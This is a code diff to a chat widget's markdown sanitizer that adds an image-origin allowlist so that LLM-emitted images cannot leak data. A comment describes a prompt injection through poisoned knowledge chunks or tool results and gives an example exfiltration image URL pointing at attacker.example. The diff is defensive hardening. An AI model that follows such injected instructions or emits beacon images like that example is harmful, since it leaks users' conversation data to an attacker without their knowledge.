@@ -5,6 +5,7 @@
  */
 
 import DOMPurify from 'dompurify';
+import { getApiOrigin } from './endpoints.js';
 
 // Single source of truth for the HTML sanitization policy.
 // Every caller MUST go through parseMarkdown — never write the unsanitized
@@ -14,10 +15,11 @@ import DOMPurify from 'dompurify';
 // - `style` is intentionally OFF — CSS allows exfiltration via
 //   `background-image: url(...)` and click-jacking overlays. Image sizing
 //   lives in our message-bubble CSS class instead.
-// - `img` stays for the markdown `![alt](url)` syntax, but the post-sanitize
-//   hook below forces `loading="lazy"`, `referrerpolicy="no-referrer"`, and
-//   drops any `src` that isn't an absolute HTTPS URL or a data: URI. That
-//   stops the LLM beaconing the visitor's IP via `<img src="http://...">`.
+// - `img` stays for the markdown `![alt](url)` syntax, but only for sources
+//   that pass isAllowedImageSrc() (see below). Other images are rendered as a
+//   plain link instead, and the post-sanitize hook drops any `src` that still
+//   slips through, plus forces `loading="lazy"` and
+//   `referrerpolicy="no-referrer"`.
 // - `a[href]` keeps `target="_blank" rel="noopener noreferrer"` forced on
 //   every anchor via the hook, regardless of what the markdown produced.
 const DOMPURIFY_CONFIG = {
@@ -57,6 +59,55 @@ const DOMPURIFY_CONFIG = {
   ADD_ATTR: ['target', 'rel']
 };
 
+// Raster images embedded inline. They make no network request, so they cannot
+// leak anything. data:image/svg+xml is deliberately left out — even though
+// <img>-loaded SVG can't execute scripts, it has historically been a hotbed of
+// parser-mutation XSS via DOMPurify and a vector for fetching remote refs.
+// Operator-supplied logos go through safeImageUrl in utils.js where SVG is
+// allowed (trusted source); LLM-emitted markdown gets this stricter policy.
+const RASTER_DATA_URI = /^data:image\/(png|jpe?g|gif|webp);base64,/i;
+
+/**
+ * Image-exfiltration guard for assistant markdown (same policy as the
+ * dashboard's AssistantMessageBody.vue).
+ *
+ * Assistant output can be steered by a prompt injection (a poisoned knowledge
+ * chunk or tool result). The browser loads an <img> by itself, so
+ * `![](https://attacker.example/?leak=...)` would send conversation data to
+ * the attacker with no click. Images may therefore only load from:
+ *   - the page the widget runs on (same origin),
+ *   - the widget API origin (knowledge-base images are served from there),
+ *   - inline raster data: URIs.
+ * @param {string} src - the image URL as written in the markdown
+ * @returns {boolean}
+ */
+export function isAllowedImageSrc(src) {
+  if (typeof src !== 'string' || src.trim() === '') return false;
+  const value = src.trim();
+  if (RASTER_DATA_URI.test(value)) return true;
+
+  let url;
+  try {
+    url = new URL(value, window.location.href);
+  } catch {
+    return false;
+  }
+  if (url.protocol !== 'https:' && url.protocol !== 'http:') return false;
+
+  return url.origin === window.location.origin || url.origin === getApiOrigin();
+}
+
+// Reverse escapeHtml() for the few entities it produces, so a URL captured
+// from already-escaped markdown can be checked as the browser will read it.
+function unescapeHtml(text) {
+  return text
+    .replace(/&lt;/g, '<')
+    .replace(/&gt;/g, '>')
+    .replace(/&quot;/g, '"')
+    .replace(/&#039;/g, "'")
+    .replace(/&amp;/g, '&');
+}
+
 // Post-sanitize hook: enforce safe defaults on every link and image the LLM
 // emits, regardless of what the markdown parser produced. Registered once at
 // module load — DOMPurify dedupes hooks by reference, so re-imports are safe.
@@ -66,15 +117,9 @@ DOMPurify.addHook('afterSanitizeAttributes', node => {
     node.setAttribute('rel', 'noopener noreferrer');
   }
   if (node.tagName === 'IMG') {
-    const src = node.getAttribute('src') || '';
-    // Allow https:// and raster data: URIs only. We deliberately drop
-    // data:image/svg+xml here — even though <img>-loaded SVG can't execute
-    // scripts, it has historically been a hotbed of parser-mutation XSS via
-    // DOMPurify and a vector for fetching remote refs / leaking CSP signals.
-    // Operator-supplied logos go through safeImageUrl in utils.js where SVG
-    // is allowed (trusted source); LLM-emitted markdown gets the stricter
-    // policy here (untrusted source).
-    if (!/^(https:\/\/|data:image\/(png|jpe?g|gif|webp);base64,)/i.test(src)) {
+    // Defense in depth: the markdown parser already turns disallowed images
+    // into links, so this only catches an <img> that reached us another way.
+    if (!isAllowedImageSrc(node.getAttribute('src') || '')) {
       node.removeAttribute('src');
     }
     node.setAttribute('loading', 'lazy');
@@ -184,10 +229,14 @@ export function parseMarkdownToHtml(text) {
   // Images ![alt](url) — MUST come before links to prevent link regex from
   // matching. Sizing/rounding now lives in the message-bubble CSS (.chatvia-
   // widget-bubble img); `style=` is dropped by the DOMPurify config above.
-  html = html.replace(
-    /!\[([^\]]*)\]\(([^)]+)\)/g,
-    '<img src="$2" alt="$1" class="chatvia-widget-md-img">'
-  );
+  // An image from a source outside the allowed origins becomes a plain link
+  // (labelled with its alt text, or the URL), so it only loads on a click.
+  html = html.replace(/!\[([^\]]*)\]\(([^)]+)\)/g, (_, alt, src) => {
+    if (isAllowedImageSrc(unescapeHtml(src))) {
+      return `<img src="${src}" alt="${alt}" class="chatvia-widget-md-img">`;
+    }
+    return `<a href="${src}" target="_blank" rel="noopener noreferrer">${alt.trim() || src}</a>`;
+  });
 
   // Links [text](url)
   html = html.replace(
